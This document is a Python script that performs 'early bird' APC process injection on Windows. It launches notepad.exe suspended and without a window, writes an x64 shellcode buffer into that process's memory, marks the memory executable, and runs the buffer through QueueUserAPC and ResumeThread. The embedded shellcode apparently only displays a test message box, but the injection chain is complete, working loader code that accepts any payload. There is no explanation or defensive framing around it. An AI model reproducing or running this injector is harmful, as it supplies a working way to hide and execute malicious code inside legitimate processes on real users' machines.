from ctypes import *
from ctypes.wintypes import *
import subprocess

# Define necessary Windows API constants and types
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)
LPTHREAD_START_ROUTINE = LPVOID
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
VIRTUAL_MEM = (MEM_RESERVE | MEM_COMMIT)
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
EXECUTE_IMMEDIATELY = 0x0
CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

# Define SECURITY_ATTRIBUTES structure for process and thread creation
class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', DWORD),
                ('lpSecurityDescriptor', LPVOID),
                ('bInheritHandle', BOOL)]

LPSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)

# Define STARTUPINFO structure for process creation
class STARTUPINFO(Structure):
    _fields_ = [('cb', DWORD),
                ('lpReserved', LPTSTR),
                ('lpDesktop', LPTSTR),
                ('lpTitle', LPTSTR),
                ('dwX', DWORD),
                ('dwY', DWORD),
                ('dwXSize', DWORD),
                ('dwYSize', DWORD),
                ('dwXCountChars', DWORD),
                ('dwYCountChars', DWORD),
                ('dwFillAttribute', DWORD),
                ('dwFlags', DWORD),
                ('wShowWindow', WORD),
                ('cbReserved2', WORD),
                ('lpReserved2', LPBYTE),
                ('hStdInput', HANDLE),
                ('hStdOutput', HANDLE),
                ('hStdError', HANDLE)]

# Define PROCESS_INFORMATION structure to receive process creation details
class PROCESS_INFORMATION(Structure):
    _fields_ = [('hProcess', HANDLE),
                ('hThread', HANDLE),
                ('dwProcessId', DWORD),
                ('dwThreadId', DWORD),]


# Load kernel32.dll and define argument and result types for used functions
kernel32 = WinDLL('kernel32', use_last_error=True)

# Custom type for APC function
PAPCFUNC = CFUNCTYPE(None, POINTER(ULONG))

kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
kernel32.VirtualAllocEx.restype = LPVOID

kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, SIZE_T, POINTER(SIZE_T)]
kernel32.WriteProcessMemory.restype = BOOL

kernel32.CreateRemoteThread.argtypes = [HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD]
kernel32.CreateRemoteThread.restype = HANDLE

kernel32.VirtualProtectEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, LPDWORD]
kernel32.VirtualProtectEx.restype = BOOL

kernel32.CreateProcessA.argtypes = [LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION)]
kernel32.CreateProcessA.restype = BOOL

kernel32.QueueUserAPC.argtypes = [PAPCFUNC, HANDLE, POINTER(ULONG)]
kernel32.QueueUserAPC.restype = BOOL

kernel32.ResumeThread.argtypes = [HANDLE]
kernel32.ResumeThread.restype = BOOL

# Shellcode to be injected and executed
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
buf += b"\x48\x8b\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b"
buf += b"\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a"
buf += b"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
buf += b"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
buf += b"\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
buf += b"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
buf += b"\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
buf += b"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31"
buf += b"\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75"
buf += b"\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
buf += b"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
buf += b"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e"
buf += b"\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20"
buf += b"\x41\x52\xff\xe0\x58\x41\x59\x5a\x3e\x48\x8b\x12"
buf += b"\xe9\x49\xff\xff\xff\x5d\x3e\x48\x8d\x8d\x39\x01"
buf += b"\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5\x49\xc7"
buf += b"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
buf += b"\x00\x3e\x4c\x8d\x85\x2c\x01\x00\x00\x48\x31\xc9"
buf += b"\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41"
buf += b"\xba\xf0\xb5\xa2\x56\xff\xd5\x53\x68\x65\x6c\x6c"
buf += b"\x63\x6f\x64\x65\x20\x45\x78\x65\x63\x75\x74\x69"
buf += b"\x6f\x6e\x3a\x20\x53\x75\x63\x63\x65\x73\x73\x21"
buf += b"\x00\x54\x65\x73\x74\x20\x4d\x65\x73\x73\x61\x67"
buf += b"\x65\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c"
buf += b"\x00"

# Function to check the success of Windows API calls
def verify_success(result, func, args):
    if not result:
        raise WinError()

# STARTUPINFO for the process to be created
startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1  # STARTF_USESHOWWINDOW
startup_info.wShowWindow = 1  # SW_SHOWNORMAL

# PROCESS_INFORMATION structure to receive process details
process_info = PROCESS_INFORMATION()

# Create a new process in suspended state without a window
is_created = kernel32.CreateProcessA(
    None,  # Application name
    b"C:\\Windows\\System32\\notepad.exe",  # Command line
    None,  # Process security attributes
    None,  # Thread security attributes
    False,  # Inherit handles
    CREATE_SUSPENDED | CREATE_NO_WINDOW,  # Creation flags
    None,  # Environment
    None,  # Current directory
    byref(startup_info),  # STARTUPINFO pointer
    byref(process_info))  # PROCESS_INFORMATION pointer
verify_success(is_created, "CreateProcessA", None)
print(f"Started process: Handle:{process_info.hProcess}, PID:{process_info.dwProcessId}, TID:{process_info.dwThreadId}")

# Allocate memory in the target process for the shellcode.
# Reserves and commits memory within the virtual address space of the target process.
# Memory is initially set with PAGE_READWRITE protection to write the shellcode into it.
remote_memory_address = kernel32.VirtualAllocEx(
    process_info.hProcess,
    None,  # Let the system decide where to allocate memory (NULL pointer).
    len(buf),  # Size of the shellcode.
    VIRTUAL_MEM,  # Allocation type (MEM_RESERVE | MEM_COMMIT).
    PAGE_READWRITE)  # Initial memory protection.
verify_success(remote_memory_address, "VirtualAllocEx", None)
print(f"Remote Memory Allocated at: {hex(remote_memory_address)}")

# Write the shellcode into the allocated memory.
# Copy shellcode into the allocated space in the target process.
bytes_written = SIZE_T()
is_written = kernel32.WriteProcessMemory(
    process_info.hProcess,
    remote_memory_address,  # Address of the allocated memory.
    buf,  # Shellcode to write.
    len(buf),  # Size of the shellcode.
    byref(bytes_written))  # Number of bytes written.
verify_success(is_written, "WriteProcessMemory", None)
print(f"Shellcode Written: {bytes_written.value} bytes")

# Change memory protection of the allocated memory to execute/read.
old_protection = DWORD()
is_protected = kernel32.VirtualProtectEx(
    process_info.hProcess,
    remote_memory_address,  # Address of the allocated memory.
    len(buf),  # Size of the shellcode.
    PAGE_EXECUTE_READ,  # New memory protection.
    byref(old_protection))  # Previous memory protection.
verify_success(is_protected, "VirtualProtectEx", None)
print(f"Memory protection changed from {old_protection.value} to {PAGE_EXECUTE_READ}")

# Queue an APC (Asynchronous Procedure Call) to the suspended thread to execute the shellcode.
# APCs are executed when the thread is in an alertable state, which will occur when the thread resumes.
is_queued = kernel32.QueueUserAPC(
    PAPCFUNC(remote_memory_address),  # Function pointer to the shellcode.
    process_info.hThread,  # Handle to the thread.
    None)  # Data passed to the function (not used here).
verify_success(is_queued, "QueueUserAPC", None)
print(f"APC queued to thread ID: {process_info.dwThreadId}")

# Resume the suspended thread to trigger the execution of the shellcode via the queued APC.
# Resuming the thread allows the process to start and execute the injected shellcode.
is_resumed = kernel32.ResumeThread(process_info.hThread)
verify_success(is_resumed, "ResumeThread", None)
print(f"Thread resumed: ID: {process_info.dwThreadId}")